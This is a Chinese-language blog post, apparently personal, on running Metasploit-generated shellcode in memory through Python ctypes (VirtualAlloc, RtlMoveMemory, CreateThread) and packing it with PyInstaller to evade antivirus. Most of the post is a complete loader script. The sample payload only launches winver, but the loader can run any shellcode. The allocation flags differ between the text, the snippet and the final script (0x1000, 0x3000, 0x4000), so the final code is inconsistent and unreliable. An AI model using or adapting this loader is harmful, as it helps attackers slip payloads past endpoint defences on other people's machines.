---
title: "MSF ShellCode Bypass"
date: 2018-05-03T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ["metasploit",'shellcode','python']
categories: ['bypass']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

利用 Python 在内存中执行 ShellCode, 经过 Pynstaller 的封装达到免杀的效果.

在 Freebuf 看各种 APT 分析的时候总能找到 “不落地” “内存执行” 之类的字词, 无奈 C++ 不会, 只能用 Python.

至于 C++ 里面的 windows api, 可以用 ctypes 库来实现.

<!--more-->

# Functions

一些在 windows 中进行内存操作的函数

*ctypes 中的 windows api 调用格式为 ctypes.windll.kernel32.xxx*

## VirtualAlloc

申请内存地址

声明

```
LPVOID VirtualAlloc{
LPVOID lpAddress,
DWORD dwSize,
DWORD flAllocationType,
DWORD flProtect
};

lpAddress 分配的内存区域地址
dwSite 分配大小
flAllocationType 分配类型
flProtect 初始保护属性
```

flAllocationType 这里设为 0x1000, 申请内存并初始化.

flProtect 则为 0x40, 即可执行, 可读写.

## RtllMoveMemory

将内容复制到指定的内存地址

声明

```
VOID RtlMoveMemory(
VOID UNALIGNED *Destination,
const VOID UNALIGNED *Source,
SIZE_T Length
);

Destination 目的地址的指针
Source 数据
Length 长度
```

Destination 就是之前申请内存地址的引用.

## CreateThread

创建线程

声明

```
HANDLE CreateThread(
LPSECURITY_ATTRIBUTES lpThreadAttributes,
SIZE_T dwStackSize,
LPTHREAD_START_ROUTINE lpStartAddress,
LPVOID lpParameter,
DWORD dwCreationFlags,
LPDWORD lpThreadId
)

lpThreadAttributes 定义新线程的安全属性 默认为 0
dwStackSize 线程堆栈大小 默认为 0
lpStartAddress 指向线程函数地址 (具体执行的代码)
lpParameter 传递给线程函数的参数 默认为 0
dwCreationFlags 线程运行状态 0 为立即执行
lpThreadId 线程 ID 编号
```

lpStartAddress 仍为之前申请内存地址的引用.

## WaitForSingleObject

监听 handle 状态

声明

```
DWORD WaitForSingleObject(
HANDLE hHandle,
DWORD dwMilliseconds
);
1
2
hHandle 对象句柄
dwMilliseconds 定时时间间隔 指定为非零值表示一直等待直到 Handle 触发.
```

hHandle 为之前创建线程函数的引用.

## Other

```
from_buffer_copy 解码 shellcode
c_int C++ 的 int 类型
c_char C++ 的 char 类型
pointer C++ 的 指针
```

# Code

首先引入 ctypes 库.

```
import ctypes
```

**生成 shellcode**

这里执行 win 自带的命令 winver.

`msfvenom -p windows/exec CMD=winver -f c`

返回结果.

`unsigned char shellcode[]='xxxx'`

**整理 shellcode**

```
shellcode = b""
shellcode = shellcode  + b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
shellcode = shellcode  + b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
shellcode = shellcode  + b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
shellcode = shellcode  + b"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
shellcode = shellcode  + b"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
shellcode = shellcode  + b"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
shellcode = shellcode  + b"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
shellcode = shellcode  + b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
shellcode = shellcode  + b"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
shellcode = shellcode  + b"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
shellcode = shellcode  + b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56"
shellcode = shellcode  + b"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
shellcode = shellcode  + b"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x77\x69\x6e\x76"
shellcode = shellcode  + b"\x65\x72\x00"
```

**申请内存地址**

```
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
```

**解码 shellcode**

```
buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
```
C++ 中没有 string 类型 所以只能用 `char * Length` 的方式保存字符串.

**复制到指定内存地址**

```
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
```

这里对 ptr 进行了 C++ int, 因为引用是 Python 变量, 而 Python 是动态语言, 所以要进行类型转换. 下面的也一样.

**创建线程**

```
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
```
**监听 handle 状态**

```
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
```

**全部代码**

```
#!/usr/bin/python
import ctypes

shellcode = b""
shellcode = shellcode  + b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
shellcode = shellcode  + b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
shellcode = shellcode  + b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
shellcode = shellcode  + b"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
shellcode = shellcode  + b"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
shellcode = shellcode  + b"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
shellcode = shellcode  + b"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
shellcode = shellcode  + b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
shellcode = shellcode  + b"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
shellcode = shellcode  + b"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
shellcode = shellcode  + b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56"
shellcode = shellcode  + b"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
shellcode = shellcode  + b"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x77\x69\x6e\x76"
shellcode = shellcode  + b"\x65\x72\x00"
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x4000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
```

之后可以对它进行封装 例如:

[curtis992250/shecodject](https://github.com/TaroballzChen/shecodject)

或者用 Pyinstaller.